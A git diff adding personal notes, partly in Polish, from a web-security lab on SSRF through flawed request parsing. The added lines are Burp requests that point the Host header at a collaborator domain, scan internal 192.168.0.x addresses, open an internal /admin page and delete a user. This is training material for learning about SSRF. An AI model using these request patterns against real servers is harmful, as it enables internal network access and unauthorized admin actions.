@@ -107,3 +107,29 @@ my:
 <img width="874" height="519" alt="image" src="https://github.com/user-attachments/assets/2a73df06-0bad-47fc-97c7-bbb83e8124d6" />
 
 
+Lab: SSRF via flawed request parsing
+
+repeater:
+GET / 
+->
+GET https://0af50039039a37ad80e117d40009002c.web-security-academy.net HTTP/2
+Host: 0af50039039a37ad80e117d40009002c.web-security-academy.net
+
+repeater:
+check:
+GET https://0af50039039a37ad80e117d40009002c.web-security-academy.net HTTP/2
+Host: ei0ps06ctwtcl8myhx59qb558wen2lqa.oastify.com
+
+intruder:
+uncheck: Update host header to match targer
+szukamy hosta 1-255
+GET https://0af50039039a37ad80e117d40009002c.web-security-academy.net HTTP/2
+Host: 192.168.0.$0$
+
+repeater:
+GET https://0af50039039a37ad80e117d40009002c.web-security-academy.net/admin HTTP/2
+Host: 192.168.0.108
+
+repeater:
+GET https://0af50039039a37ad80e117d40009002c.web-security-academy.net/admin/delete?username=carlos&csrf=qXDiAKVM0rehNKUVcFCxbf6npsAFtMmR
+Host: 192.168.0.108
